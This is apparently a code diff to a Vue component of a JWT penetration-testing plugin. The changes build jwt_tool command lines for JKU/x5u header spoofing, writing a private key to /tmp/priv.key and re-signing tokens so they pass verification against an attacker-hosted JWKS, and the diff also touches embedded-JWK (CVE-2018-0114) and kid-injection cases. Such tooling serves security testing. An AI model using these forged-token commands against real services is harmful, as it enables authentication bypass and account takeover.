@@ -38,8 +38,8 @@
         </div>
       </section>
 
-      <!-- Modified JWT -->
-      <section class="px-4 py-3 border-b border-gray-700">
+      <!-- Modified JWT (hidden for info-only rows such as JWKS verification) -->
+      <section v-if="result.modifiedJWT" class="px-4 py-3 border-b border-gray-700">
         <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Modified JWT</p>
         <div class="bg-gray-900 rounded p-2 font-mono text-xs break-all text-gray-300 select-all max-h-32 overflow-y-auto">
           <span class="text-yellow-400">{{ jwtParts[0] }}</span>.<span class="text-blue-400">{{ jwtParts[1] }}</span>.<span class="text-red-400">{{ jwtParts[2] }}</span>
@@ -163,7 +163,7 @@ function decodeSeg(seg: string): Record<string, unknown> | null {
 // the others reproduce the equivalent attack (noted where the match is not exact).
 const jwtTool = computed<{ cmd: string; note?: string } | null>(() => {
   const r = props.result;
-  if (!r || !r.originalJWT) return null;
+  if (!r || !r.originalJWT || r.infoOnly) return null;
   const J = "python3 jwt_tool.py";
   const orig = `'${r.originalJWT}'`;
   const modHeader = decodeSeg(r.modifiedJWT.split(".")[0] ?? "") ?? {};
@@ -198,21 +198,27 @@ const jwtTool = computed<{ cmd: string; note?: string } | null>(() => {
         cmd: `${J} ${orig} -X i`,
         note: "CVE-2018-0114. jwt_tool generates its OWN embedded key, so the jwk and signature differ from this row, but the attack is equivalent.",
       };
-    case "jkuSpoof": {
-      const jku = typeof modHeader.jku === "string" ? modHeader.jku : "<your-jwks-url>";
-      return {
-        cmd: `${J} ${orig} -X s -ju '${jku}'`,
-        note: "jwt_tool generates its own key and JWKS — host jwt_tool's JWKS at the -ju URL (not this plugin's). The resulting token differs but the attack is equivalent.",
-      };
-    }
-    case "x5uSpoof":
+    case "jkuSpoof":
+    case "x5uSpoof": {
+      const claim = r.technique === "x5uSpoof" ? "x5u" : "jku";
+      const url = typeof modHeader[claim] === "string" ? (modHeader[claim] as string) : "<your-jwks-url>";
+      const kid = typeof modHeader.kid === "string" ? (modHeader.kid as string) : "jwt-attacker-spoof-key";
+      if (!r.signingKeyPem) {
+        return {
+          cmd: `${J} ${orig} -X s -ju '${url}'`,
+          note: "Signing key unavailable; jwt_tool's -X s uses its OWN key (won't match the hosted JWKS).",
+        };
+      }
+      const keyB64 = btoa(r.signingKeyPem);
       return {
         cmd:
-          `# jwt_tool has no built-in x5u spoofing exploit.\n` +
-          `# Closest built-in attack is JKU spoofing:\n` +
-          `${J} ${orig} -X s -ju '<your-jwks-url>'`,
-        note: "x5u spoofing isn't directly supported by jwt_tool; the JKU spoof (-X s) is the nearest equivalent.",
+          `echo -n '${keyB64}' | base64 -d > /tmp/priv.key\n` +
+          `${J} ${orig} -I -hc ${claim} -hv '${url}' -hc kid -hv '${kid}' -S rs256 -pr /tmp/priv.key`,
+        note:
+          `Writes the spoofing private key to /tmp/priv.key, then re-signs with it — using the SAME key as the hosted JWKS, ` +
+          `so the token validates. Inject the ${claim} + kid headers and sign RS256. Host the JWKS (Configuration tab) at the ${claim} URL.`,
       };
+    }
     case "kidInject": {
       const kid = typeof modHeader.kid === "string" ? modHeader.kid : "";
       const secret = r.hmacSecret ?? "";
